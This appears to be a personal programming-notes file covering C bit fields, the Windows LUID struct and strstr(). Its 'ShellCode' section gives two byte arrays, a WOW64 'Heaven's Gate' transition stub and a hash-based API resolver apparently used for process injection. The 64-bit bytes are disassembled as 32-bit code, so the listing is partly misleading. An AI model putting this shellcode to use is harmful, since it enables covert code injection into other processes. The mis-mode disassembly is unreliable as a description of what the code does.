# Chrome

## C中的位域

C语言标准还规定，只有有限的几种数据类型可以用于位域。在 ANSI C 中，这几种数据类型是 int、signed int 和 unsigned int（int 默认就是 signed int）；到了 C99，_Bool 也被支持了。

**位域的存储规则：**

1) 当相邻成员的类型相同时，如果它们的位宽之和小于类型的 sizeof 大小，那么后面的成员紧邻前一个成员存储，直到不能容纳为止；如果它们的位宽之和大于类型的 sizeof 大小，那么后面的成员将从新的存储单元开始，其偏移量为类型大小的整数倍。
2) 当相邻成员的类型不同时，不同的编译器有不同的实现方案，[GCC](http://c.biancheng.net/gcc/) 会压缩存储，而 VC/VS 不会。
3) 无名位域一般用来作填充或者调整成员位置。因为没有名称，无名位域不能使用。usigned int   :20

## LUID

Describes a local indentifier for an adaptor.

```c++
typedef struct _LUID {
  DWORD LowPart;
  LONG  HighPart;
} LUID, *PLUID;
```

## ShellCode

```shell
BYTE __Execute64[] = 
"\x55\x89\xE5\x56\x57\x8B\x75\x08\x8B\x4D\x0C\xE8\x00\x00\x00\x00"
"\x58\x83\xC0\x25\x83\xEC\x08\x89\xE2\xC7\x42\x04\x33\x00\x00\x00"
"\x89\x02\xE8\x09\x00\x00\x00\x83\xC4\x14\x5F\x5E\x5D\xC2\x08\x00"
"\x8B\x3C\x24\xFF\x2A\x48\x31\xC0\x57\xFF\xD6\x5F\x50\xC7\x44\x24"
"\x04\x23\x00\x00\x00\x89\x3C\x24\xFF\x2C\x24";
//Disassemble
55                         push ebp
89 E5                      mov  ebp, esp
56                         push esi
57                         push edi
8B 75 08                   mov  esi, dword ptr [ebp + 8] //获取esi = ebp
8B 4D 0C                   mov  ecx, dword ptr [ebp + 0xc] //ecx = eip
E8 00 00 00 00             call 0x10 //直接调用传入的参数地址 PashArguments + jmp
58                         pop  eax //
83 C0 25                   add  eax, 0x25 
83 EC 08                   sub  esp, 8 //开8字节的空间
89 E2                      mov  edx, esp
C7 42 04 33 00 00 00       mov  dword ptr [edx + 4], 0x33
89 02                      mov  dword ptr [edx], eax
E8 09 00 00 00             call 0x30
83 C4 14                   add  esp, 0x14
5F                         pop  edi
5E                         pop  esi
5D                         pop  ebp
C2 08 00                   ret  8
8B 3C 24                   mov  edi, dword ptr [esp]
FF 2A                      ljmp [edx]
48                         dec  eax
31 C0                      xor  eax, eax
57                         push edi
FF D6                      call esi
5F                         pop  edi
50                         push eax
C7 44 24 04 23 00 00 00    mov  dword ptr [esp + 4], 0x23
89 3C 24                   mov  dword ptr [esp], edi
FF 2C 24                   ljmp [esp]

BYTE __Function64[] =
"\xFC\x48\x89\xCE\x48\x89\xE7\x48\x83\xE4\xF0\xE8\xC8\x00\x00\x00"
"\x41\x51\x41\x50\x52\x51\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48"
"\x8B\x52\x18\x48\x8B\x52\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A"
"\x4D\x31\xC9\x48\x31\xC0\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9"
"\x0D\x41\x01\xC1\xE2\xED\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C"
"\x48\x01\xD0\x66\x81\x78\x18\x0B\x02\x75\x72\x8B\x80\x88\x00\x00"
"\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44\x8B\x40"
"\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48\x01\xD6"
"\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1\x38\xE0"
"\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44\x8B\x40"
"\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49\x01\xD0"
"\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A\x41\x58"
"\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41\x59\x5A"
"\x48\x8B\x12\xE9\x4F\xFF\xFF\xFF\x5D\x4D\x31\xC9\x41\x51\x48\x8D"
"\x46\x18\x50\xFF\x76\x10\xFF\x76\x08\x41\x51\x41\x51\x49\xB8\x01"
"\x00\x00\x00\x00\x00\x00\x00\x48\x31\xD2\x48\x8B\x0E\x41\xBA\xC8"
"\x38\xA4\x40\xFF\xD5\x48\x85\xC0\x74\x0C\x48\xB8\x00\x00\x00\x00"
"\x00\x00\x00\x00\xEB\x0A\x48\xB8\x01\x00\x00\x00\x00\x00\x00\x00"
"\x48\x83\xC4\x50\x48\x89\xFC\xC3";
//Disassemble
FC                   cld   
48                   dec   eax
89 CE                mov   esi, ecx
48                   dec   eax
89 E7                mov   edi, esp
48                   dec   eax
83 E4 F0             and   esp, 0xfffffff0
E8 C8 00 00 00       call  0xd8
41                   inc   ecx
51                   push  ecx
41                   inc   ecx
50                   push  eax
52                   push  edx
51                   push  ecx
56                   push  esi
48                   dec   eax
31 D2                xor   edx, edx
65 48                dec   eax
8B 52 60             mov   edx, dword ptr [edx + 0x60]
48                   dec   eax
8B 52 18             mov   edx, dword ptr [edx + 0x18]
48                   dec   eax
8B 52 20             mov   edx, dword ptr [edx + 0x20]
48                   dec   eax
8B 72 50             mov   esi, dword ptr [edx + 0x50]
48                   dec   eax
0F B7 4A 4A          movzx ecx, word ptr [edx + 0x4a]
4D                   dec   ebp
31 C9                xor   ecx, ecx
48                   dec   eax
31 C0                xor   eax, eax
AC                   lodsb al, byte ptr [esi]
3C 61                cmp   al, 0x61
7C 02                jl    0x3d
2C 20                sub   al, 0x20
41                   inc   ecx
C1 C9 0D             ror   ecx, 0xd
41                   inc   ecx
01 C1                add   ecx, eax
E2 ED                loop  0x33
52                   push  edx
41                   inc   ecx
51                   push  ecx
48                   dec   eax
8B 52 20             mov   edx, dword ptr [edx + 0x20]
8B 42 3C             mov   eax, dword ptr [edx + 0x3c]
48                   dec   eax
01 D0                add   eax, edx
66 81 78 18 0B 02    cmp   word ptr [eax + 0x18], 0x20b
75 72                jne   0xcd
8B 80 88 00 00 00    mov   eax, dword ptr [eax + 0x88]
48                   dec   eax
85 C0                test  eax, eax
74 67                je    0xcd
48                   dec   eax
01 D0                add   eax, edx
50                   push  eax
8B 48 18             mov   ecx, dword ptr [eax + 0x18]
44                   inc   esp
8B 40 20             mov   eax, dword ptr [eax + 0x20]
49                   dec   ecx
01 D0                add   eax, edx
E3 56                jecxz 0xcc
48                   dec   eax
FF C9                dec   ecx
41                   inc   ecx
8B 34 88             mov   esi, dword ptr [eax + ecx*4]
48                   dec   eax
01 D6                add   esi, edx
4D                   dec   ebp
31 C9                xor   ecx, ecx
48                   dec   eax
31 C0                xor   eax, eax
AC                   lodsb al, byte ptr [esi]
41                   inc   ecx
C1 C9 0D             ror   ecx, 0xd
41                   inc   ecx
01 C1                add   ecx, eax
38 E0                cmp   al, ah
75 F1                jne   0x83
4C                   dec   esp
03 4C 24 08          add   ecx, dword ptr [esp + 8]
45                   inc   ebp
39 D1                cmp   ecx, edx
75 D8                jne   0x74
58                   pop   eax
44                   inc   esp
8B 40 24             mov   eax, dword ptr [eax + 0x24]
49                   dec   ecx
01 D0                add   eax, edx
66 41                inc   cx
8B 0C 48             mov   ecx, dword ptr [eax + ecx*2]
44                   inc   esp
8B 40 1C             mov   eax, dword ptr [eax + 0x1c]
49                   dec   ecx
01 D0                add   eax, edx
41                   inc   ecx
8B 04 88             mov   eax, dword ptr [eax + ecx*4]
48                   dec   eax
01 D0                add   eax, edx
41                   inc   ecx
58                   pop   eax
41                   inc   ecx
58                   pop   eax
5E                   pop   esi
59                   pop   ecx
5A                   pop   edx
41                   inc   ecx
58                   pop   eax
41                   inc   ecx
59                   pop   ecx
41                   inc   ecx
5A                   pop   edx
48                   dec   eax
83 EC 20             sub   esp, 0x20
41                   inc   ecx
52                   push  edx
FF E0                jmp   eax
58                   pop   eax
41                   inc   ecx
59                   pop   ecx
5A                   pop   edx
48                   dec   eax
8B 12                mov   edx, dword ptr [edx]
E9 4F FF FF FF       jmp   0x27
5D                   pop   ebp
4D                   dec   ebp
31 C9                xor   ecx, ecx
41                   inc   ecx
51                   push  ecx
48                   dec   eax
8D 46 18             lea   eax, [esi + 0x18]
50                   push  eax
FF 76 10             push  dword ptr [esi + 0x10]
FF 76 08             push  dword ptr [esi + 8]
41                   inc   ecx
51                   push  ecx
41                   inc   ecx
51                   push  ecx
49                   dec   ecx
B8 01 00 00 00       mov   eax, 1
00 00                add   byte ptr [eax], al
00 00                add   byte ptr [eax], al
48                   dec   eax
31 D2                xor   edx, edx
48                   dec   eax
8B 0E                mov   ecx, dword ptr [esi]
41                   inc   ecx
BA C8 38 A4 40       mov   edx, 0x40a438c8
FF D5                call  ebp
48                   dec   eax
85 C0                test  eax, eax
74 0C                je    0x116
48                   dec   eax
B8 00 00 00 00       mov   eax, 0
00 00                add   byte ptr [eax], al
00 00                add   byte ptr [eax], al
EB 0A                jmp   0x120
48                   dec   eax
B8 01 00 00 00       mov   eax, 1
00 00                add   byte ptr [eax], al
00 00                add   byte ptr [eax], al
48                   dec   eax
83 C4 50             add   esp, 0x50
48                   dec   eax
89 FC                mov   esp, edi
C3                   ret   

```

## strstr()

```c
const char * strstr ( const char * str1, const char * str2 );
      char * strstr (       char * str1, const char * str2 );
//Locate substring
//Returns a pointer to the first occurrence of str2 in str1, or a null pointer if str2 is not part of str1.
/The matching process does not include the terminating null-characters, but it stops there.

```

